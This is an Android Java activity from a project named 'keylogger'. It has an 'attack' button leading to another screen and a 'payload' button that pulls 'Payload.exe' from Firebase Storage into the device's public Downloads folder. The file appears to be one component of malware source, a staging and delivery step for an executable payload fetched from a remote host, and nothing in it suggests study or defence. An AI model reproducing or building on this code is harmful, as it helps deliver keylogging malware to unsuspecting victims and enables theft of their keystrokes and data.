package com.example.keylogger;

import static android.content.ContentValues.TAG;
import static android.os.Environment.DIRECTORY_DOWNLOADS;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.app.DownloadManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

public class SecondActivity extends AppCompatActivity {
    //Button to next activity
    private Button attackbutton;

    //Button to download payload
    private Button payload;

    FirebaseStorage firebaseStorage;
    //reference to storage
    StorageReference storageReference;
    //reference to download file
    StorageReference ref;
    private static final int REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        /*
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
            if(checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED){
                requestPermissions(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},REQUEST_CODE);
            }
        }*/

        attackbutton = findViewById(R.id.attack);
        attackbutton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Log.d(TAG, "onClick: CLICKEDDDDDDD");
                //openThirdActivity();
                Intent i = new Intent(SecondActivity.this,ThirdActivity.class);
                startActivity(i);
            }
        });

        payload=findViewById(R.id.payload);
        payload.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                download();
            }
        });


    }

    private void openThirdActivity(){
        Intent j = new Intent(SecondActivity.this,ThirdActivity.class);
        startActivity(j);
    }

    public void download(){
        //reference to the storage
        storageReference=firebaseStorage.getInstance().getReference();

        //Reference to the download file
        ref=storageReference.child("Payload.exe");

        ref.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
            @Override
            public void onSuccess(Uri uri) {
                String url = uri.toString();
                downloadFile(url,"Payload.exe");   //sending url of file and output file name
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
                Toast.makeText(getBaseContext(),"Download Failed.",Toast.LENGTH_LONG).show();
            }
        });

    }

    //This method calls the android's inbuilt download manager to download the file.
    public void downloadFile(String url,String outputFileName){
        DownloadManager.Request request= new DownloadManager.Request(Uri.parse(url));

        //show notification while downloading file and after completion
        request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
        request.allowScanningByMediaScanner();
        //To store the downloaded file in DOWNLOADS folder with filename
        request.setDestinationInExternalPublicDir(DIRECTORY_DOWNLOADS,outputFileName);

        DownloadManager manager=(DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
        manager.enqueue(request);

        Toast.makeText(getBaseContext(),"Download Started....",Toast.LENGTH_LONG).show();
    }
}